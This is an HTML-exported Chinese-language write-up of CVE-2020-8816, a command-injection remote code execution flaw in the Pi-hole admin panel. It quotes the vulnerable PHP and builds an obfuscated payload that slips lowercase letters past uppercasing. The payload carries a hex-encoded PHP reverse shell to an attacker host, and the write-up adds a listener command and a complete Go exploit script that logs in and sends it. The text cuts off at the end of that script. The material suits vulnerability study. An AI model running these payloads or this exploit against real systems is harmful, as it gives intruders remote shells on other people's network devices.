<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2020-8816pi-hole-远程代码执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE 2020-8816</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Pi-hole </span><span class="csECDA2D3">远程代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Pi-hole &lt;= 4.3.2</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs8926E06">./scripts/pi-hole/php/savesettings.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;// Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return (preg_match(&#39;/([a-fA-F0-9]{2}[:]?){6}/&#39;, $mac_addr) == 1); &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$mac = $_POST[&quot;AddMAC&quot;];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if(!validMAC($mac)) {...}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$mac = strtoupper($mac);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if(isset($_POST[&quot;addstatic&quot;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exec(&quot;sudo pihole -a addstaticdhcp &quot;.$mac.&quot; &quot;.$ip.&quot; &quot;.$hostname);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if(isset($_POST[&quot;removestatic&quot;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exec(&quot;sudo pihole -a removestaticdhcp &quot;.$mac);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注意到，在</span><span class="cs8926E06">validMAC</span><span class="cs9C1B1871">函数中，只使用</span><span class="cs8926E06">preg_match</span><span class="cs9C1B1871">对</span><span class="cs8926E06">MAC</span><span class="cs9C1B1871">地址的格式进行了检查，而</span><span class="cs8926E06">preg_match</span><span class="cs9C1B1871">函数的作用是根据正则表达式的模式对字符串进行搜索匹配，并返回匹配字数。因此，只要用户的输入中存在</span><span class="cs8926E06">MAC</span><span class="cs9C1B1871">地址，就可以通过检查。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过检查的用户输入做了一次大写转换，然后直接放入了</span><span class="cs8926E06">exec</span><span class="cs9C1B1871">函数中。</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">最终的</span><span class="cs5BEC2C28">payload</span></p><p class="cs3A447A38"><span class="cs9FB05234">aaaaaaaaaaaa&amp;&amp;SHORT=${PATH##/***:/}&amp;&amp;A=${SHORT#???}&amp;&amp;P=${A%/???}&amp;&amp;B=${PWD#/???/???/}&amp;&amp;H=${B%???/?????}&amp;&amp;C=${PWD#/??}&amp;&amp;R=${C%/???/????/?????}&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;));&#39;&amp;&amp;</span></p><h4 class="cs868C439D">
			<a name="payload分析"><span class="csBF12A472">payload</span><span class="cs6EDCDAE2">分析</span></a></h4>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">1</span><span class="cs9C1B1871">、模拟</span><span class="cs8926E06">MAC</span><span class="cs9C1B1871">地址</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">aaaaaaaaaaaa</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据源码中的</span><span class="cs8926E06">validMAC()</span><span class="cs9C1B1871">函数，我们得知程序会对用户输入做一个基本的</span><span class="cs8926E06">MAC</span><span class="cs9C1B1871">地址格式判断，只要由</span><span class="cs8926E06">12</span><span class="cs9C1B1871">个字母或数字组成，就可以通过验证。</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">2</span><span class="cs9C1B1871">、获取</span><span class="cs8926E06">p,h,r</span><span class="cs9C1B1871">的小写字符</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">SHORT=${PATH##/***:/}&amp;&amp;A=${SHORT#???}&amp;&amp;P=${A%/???}&amp;&amp;B=${PWD#/???/???/}&amp;&amp;H=${B%???/?????}&amp;&amp;C=${PWD#/??}&amp;&amp;R=${C%/???/????/?????}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">原本的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">应该为：</span></p><p class="cs3A447A38"><span class="cs9FB05234">aaaaaaaaaaaa&amp;&amp;php -r &lsquo;$sock=fsockopen(&ldquo;target.0-sec.org&rdquo;,2256);exec(&ldquo;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&rdquo;);&rsquo;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是由于程序会对用户输入做一个大写转换，因此，</span><span class="cs8926E06">php -r</span><span class="cs9C1B1871">会变成</span><span class="cs8926E06">PHP -R</span><span class="cs9C1B1871">，命令无法识别，因此需要找到一种方式获取</span><span class="cs8926E06">p</span><span class="cs9C1B1871">、</span><span class="cs8926E06">h</span><span class="cs9C1B1871">、</span><span class="cs8926E06">r</span><span class="cs9C1B1871">的小写字符。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以使用环境变量，变量名都是大写字母，而变量值中可能包含各种小写字母。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在浏览器中进入</span><span class="cs8926E06">http://www.0-sec.org/admin</span><span class="cs9C1B1871">，登陆后，选择</span><span class="cs8926E06">Setting-&gt;DHCP</span><span class="cs9C1B1871">选项卡，先试一下</span><span class="cs8926E06">PATH</span><span class="cs9C1B1871">变量，输入</span><span class="cs8926E06">aaaaaaaaaaaa$PATH</span><span class="cs9C1B1871">，结果显示：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Pi-hole/%ef%bc%88CVE%202020-8816%ef%bc%89Pi-hole%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="70" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">很遗憾，没有</span><span class="cs8926E06">h</span><span class="cs9C1B1871">字符，看来还需要找其他环境变量。我在</span><span class="cs8926E06">env</span><span class="cs9C1B1871">命令的执行结果中找到了</span><span class="cs8926E06">PWD</span><span class="cs9C1B1871">变量，输入试一下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Pi-hole/%ef%bc%88CVE%202020-8816%ef%bc%89Pi-hole%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="140" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">里面有</span><span class="cs8926E06">h</span><span class="cs9C1B1871">和</span><span class="cs8926E06">r</span><span class="cs9C1B1871">，所以，我可以使用</span><span class="cs8926E06">PATH</span><span class="cs9C1B1871">和</span><span class="cs8926E06">PWD</span><span class="cs9C1B1871">两个环境变量，获得</span><span class="cs8926E06">p</span><span class="cs9C1B1871">、</span><span class="cs8926E06">h</span><span class="cs9C1B1871">、</span><span class="cs8926E06">r</span><span class="cs9C1B1871">这几个字符。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我使用了</span><span class="cs8926E06"><a class="cs508254C" href="https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html"><span class="cs4B51D5E4">Shell</span><span class="cs1C2E50E7">参数扩展</span></a></span><span class="cs9C1B1871">对这两个变量值进行截取：</span></p><p class="cs3A447A38"><span class="cs9FB05234">p:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;SHORT=${PATH##/***:/}&amp;&amp;A=${SHORT#???}&amp;&amp;P=${A%/???}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">h:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;B=${PWD#/???/???/}&amp;&amp;H=${B%???/?????}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;C=${PWD#/??}&amp;&amp;R=${C%/???/????/?????}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据</span><span class="cs8926E06"><a class="cs508254C" href="https://www.gnu.org/software/bash/manual/html_node/Pattern-Matching.html#Pattern-Matching"><span class="cs1C2E50E7">模式匹配</span></a></span><span class="cs9C1B1871">的规则，应该可以写出更简洁的方法，但是我的系统中好多</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">选项都没有开启，考虑到通用性，我就直接选择了最傻瓜的匹配方式。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3</span><span class="cs9C1B1871">、获得反向</span><span class="cs8926E06">shell</span></p><p class="cs3A447A38"><span class="cs9FB05234">$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;));&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">先把变量换成对应的字符，注意上面的</span><span class="cs9FB05234">$IFS</span><span class="cs9C1B1871">是</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">的一个内定变量，默认为</span><span class="cs9FB05234">&lt;space&gt;&lt;tab&gt;&lt;newline&gt;</span><span class="cs9C1B1871">，这里代替空格。</span></p><p class="cs3A447A38"><span class="cs9FB05234">php -r &#39;exec(hex2bin(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;))&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后替换</span><span class="cs9FB05234">hex2bin</span><span class="cs9C1B1871">的执行结果（转义符是我后加的）：</span></p><p class="cs3A447A38"><span class="cs9FB05234">php -r &#39;exec(php -r \&#39;$sock=fsockopen(&quot;target.0-sec.org&quot;,2256);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#39;)&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这段代码就可以获得一个反向</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">。</span></p><h2 class="cs868C439D">
			<a name="漏洞复现"><span class="cs83F14626">漏洞复现</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在主机的命令行中输入：</span></p><p class="cs3A447A38"><span class="cs9FB05234">ncat -nlvp 2256</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">进入监听模式，等待其他机器的连接。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">返回虚拟机，在浏览器中打开</span><span class="cs9FB05234">http://192.168.1.107/admin</span><span class="cs9C1B1871">，登录，选择</span><span class="cs8926E06">Setting-&gt;DHCP</span><span class="cs9C1B1871">选项卡，输入</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">aaaaaaaaaaaa&amp;&amp;SHORT=${PATH##/***:/}&amp;&amp;A=${SHORT#???}&amp;&amp;P=${A%/???}&amp;&amp;B=${PWD#/???/???/}&amp;&amp;H=${B%???/?????}&amp;&amp;C=${PWD#/??}&amp;&amp;R=${C%/???/????/?????}&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;));&#39;&amp;&amp;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">返回主机，可以看到主机收到了连接，可以执行命令了：</span><span class="cs8926E06"><br/><img src="Web安全/Pi-hole/%ef%bc%88CVE%202020-8816%ef%bc%89Pi-hole%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="292" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs8926E06">CVE-2020-8816.go</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">go run CVE-2020-8816.go -host $LHOST -p $LPORT -pass admin -u http://www.0-sec.org/admin/</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">./CVE-2020-8816 -host $LHOST -p $LPORT -pass admin -u http://www.0-sec.org/admin/</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Pi-hole/%ef%bc%88CVE%202020-8816%ef%bc%89Pi-hole%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="59" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Pi-hole/%ef%bc%88CVE%202020-8816%ef%bc%89Pi-hole%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="79" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Pi-hole/%ef%bc%88CVE%202020-8816%ef%bc%89Pi-hole%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="78" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">package main</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">import (</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;flag&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;log&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;strings&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;github.com/anaskhan96/soup&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;encoding/hex&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;github.com/levigross/grequests&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">type Options struct {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url, password, host, port string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">var HOST string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var URL string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var PORT string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var PASSWD string</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">func generate_shell() string{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload := &quot;php -r &#39;$sock=fsockopen(\&quot;HOST\&quot;, PORT);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&#39;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = strings.Replace(payload, &quot;HOST&quot;, HOST, 1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = strings.Replace(payload, &quot;PORT&quot;, PORT, 1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return hex.EncodeToString([]byte(payload))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">func extractFlags() *Options {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;urlPtr := flag.String(&quot;u&quot;, &quot;http://10.0.0.1/admin/&quot;, &quot;Set the Url of the admin panel&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;passPtr := flag.String(&quot;pass&quot;, &quot;admin&quot;, &quot;Admin Password&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;hostPtr := flag.String(&quot;host&quot;, &quot;10.0.0.1&quot;, &quot;Set the host for the reverse shell&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;portPtr := flag.String(&quot;p&quot;, &quot;1337&quot;, &quot;Set Port for the reverse shell&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;flag.Parse()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return &amp;Options{*urlPtr, *passPtr, *hostPtr,*portPtr}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">func doLogin(ses *grequests.Session) *grequests.Session{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;log.Println(&quot;Logging In...&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resp, err := ses.Post(URL+&quot;index.php&quot;,&amp;grequests.RequestOptions{Data: map[string]string{&quot;pw&quot;: PASSWD}})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if err != nil {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.Fatal(&quot;Error logging-in: &quot;, err)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if resp.Ok != true {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.Println(&quot;Request for log-in did not return OK&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;log.Println(&quot;Logged In!&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return ses</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">func getToken(ses *grequests.Session) string{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resp, err:= ses.Get(URL+&quot;index.php&quot;,nil)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if err != nil {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.Fatal(&quot;Error getting token: &quot;, err)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if resp.Ok != true {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.Println(&quot;Request for getting token did not return OK&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;html := soup.HTMLParse(resp.String())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;token := html.Find(&quot;div&quot;,&quot;id&quot;,&quot;token&quot;).Text()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return token</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">func Exploit(ses *grequests.Session, token string, payload string) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;full_payload := &quot;aaaaaaaaaaaa&amp;&amp;W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;X=${PATH#/???/??}&amp;&amp;H=${X%%???:*}&amp;&amp;Z=${PATH#*:/??}&amp;&amp;R=${Z%%/*}&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(\&quot;&quot; + payload + &quot;\&quot;));&#39;&amp;&amp;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resp,err := ses.Post(URL + &quot;settings.php&quot;, &amp;grequests.RequestOptions{Data: map[string]string{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;AddMAC&quot;:full_payload,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;field&quot;:&quot;DHCP&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;AddIP&quot;:&quot;10.10.10.10&quot;, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;AddHostname&quot;:&quot;10.10.10.10&quot;, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;addstatic&quot;:&quot;&quot;, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;token&quot;:token}})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if err != nil {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.Fatal(&quot;Error sending payload: &quot;, err)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if resp.Ok != true {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.Println(&quot;Request for sending payload did not return OK&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">func main(){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;options := extractFlags()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HOST = options.host</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;URL = options.url</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;PORT = options.port</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;PASSWD = options.password </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;session := grequests.NewSession(nil)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;doLogin(session)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;log.Println(&quot;Getting Token...&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;token := getToken(session)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;log.Println(&quot;Token:&quot;,token)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;log.Println(&quot;Generating payload...&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload := generate_shell()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;log.Println(&quot;Payload generated:&quot;,payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;log.Println(&quot;Sending exploit...&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Exploit(session, token, payload)</span><span class="cs8926E06"><br/></span><span 